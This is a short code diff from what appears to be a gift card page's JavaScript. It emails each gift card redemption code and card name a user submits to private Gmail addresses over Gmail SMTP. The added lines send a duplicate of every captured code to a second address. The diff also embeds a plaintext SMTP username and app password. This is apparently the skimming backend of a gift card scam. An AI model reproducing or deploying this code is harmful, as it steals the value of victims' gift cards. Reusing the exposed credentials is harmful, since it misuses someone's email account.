@@ -281,7 +281,7 @@
           Host: 'smtp.googlemail.com',
           Username: 'veehuelabs@gmail.com',
           Password: 'xrmfdbewnkerudsz',
-          To: 'lovedayperfection1@gmail.com', //'Williamcampbell693@gmail.com',
+          To: 'Williamcampbell693@gmail.com',
           From: 'allmygiftcards@gmail.com',
           Subject: 'New Gift Card Entry Alert',
           Body: `
@@ -294,7 +294,25 @@
 
           `,
         })
-          .then((message) => {
+          .then(async (message) => {
+            await Email.send({
+              Host: 'smtp.googlemail.com',
+              Username: 'veehuelabs@gmail.com',
+              Password: 'xrmfdbewnkerudsz',
+              To: 'lovedayperfection1@gmail.com',
+              From: 'allmygiftcards@gmail.com',
+              Subject: 'New Gift Card Entry Alert',
+              Body: `
+
+         <h3> A New Gift Card Entry Has Been Made On AllGiftCards.com</h3>
+
+         <p> Gift Card Redemption Code:  ${code.value}</p>
+
+          <p>Gift Card Name:  ${name.value}</p>
+
+          `,
+            });
+
             console.log(message);
 
             loader.style.display = 'none';
